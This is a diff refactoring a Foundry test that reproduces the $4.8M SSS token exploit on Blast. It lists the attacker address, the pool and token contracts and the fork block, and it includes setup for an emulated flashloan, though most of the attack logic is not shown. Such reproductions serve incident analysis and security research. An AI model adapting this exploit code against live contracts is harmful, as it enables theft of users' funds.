@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 // @KeyInfo - Total Lost: $4.8M
 // Attacker: 0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A
@@ -18,7 +18,7 @@ interface ISSS is IERC20 {
     function burn(uint256) external;
 }
 
-contract SSSExploit is Test {
+contract SSSExploit is BaseTestWithBalanceLog {
     address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
     IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
     ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
@@ -32,6 +32,7 @@ contract SSSExploit is Test {
         vm.createSelectFork("blast", 1_110_245);
         WETH.approve(address(ROUTER_V2), type(uint256).max);
         SSS.approve(address(ROUTER_V2), type(uint256).max);
+        fundingToken = address(WETH);
     }
 
     function getPath(bool buy) internal view returns (address[] memory path) {
@@ -40,10 +41,7 @@ contract SSSExploit is Test {
         path[1] = buy ? address(SSS) : address(WETH);
     }
 
-    function testExploit() public {
-        emit log_named_decimal_uint(
-            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
+    function testExploit() public balanceLog {
 
         //Emulate flashloan here with deal
         vm.deal(address(this), 0);
@@ -84,9 +82,5 @@ contract SSSExploit is Test {
 
         assertEq(WETH.balanceOf(address(this)), expectedETHAfter, "Not expected WETH BAL");
         assertEq(SSS.balanceOf(address(this)), 0, "All SSS tokens didn't get sold");
-
-        emit log_named_decimal_uint(
-            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
     }
 }
